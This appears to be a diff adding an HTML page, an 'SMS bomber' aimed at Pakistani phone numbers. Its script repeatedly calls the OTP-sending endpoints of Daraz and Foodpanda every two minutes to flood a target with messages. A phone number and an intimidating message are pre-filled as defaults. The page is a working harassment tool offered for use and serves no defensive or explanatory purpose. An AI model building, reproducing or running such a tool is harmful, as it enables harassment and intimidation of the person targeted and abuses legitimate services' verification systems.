@@ -1,0 +1,43 @@
+<!-- sms_bomber_pk.html -->
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Pak SMS Bomber</title>
+  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+</head>
+<body>
+  <h1>🇵🇰 Silent SMS Bomber (Pakistan)</h1>
+  <input type="text" id="number" placeholder="Enter Number (03XX)" value="03451278831" />
+  <input type="text" id="msg" placeholder="Your Message" value="CCTV on karo, tera kand dekh raha hoon!" />
+  <button onclick="startAttack()">Start Bombing</button>
+  <p id="status">Ready...</p>
+
+
+  <script>
+    function sendSms() {
+      const num = $('#number').val().replace(/^0/, '92');
+      const msg = encodeURIComponent($('#msg').val());
+
+
+      // Daraz
+      $.post('https://m.daraz.pk/poy/customer/account/createSendSms', {phoneNumber: num});
+
+
+      // Foodpanda PK
+      $.post('https://foodpanda.pk/customers/otp/send', {
+        'customer[phone_number]': num,
+        'customer[country_iso_code]': 'PK'
+      });
+
+
+      $('#status').text('🔥 Bombing... Last hit: ' + new Date().toLocaleTimeString());
+    }
+
+
+    function startAttack() {
+      setInterval(sendSms, 120000); // Har 2 minute baad
+      sendSms();
+    }
+  </script>
+</body>
+</html>
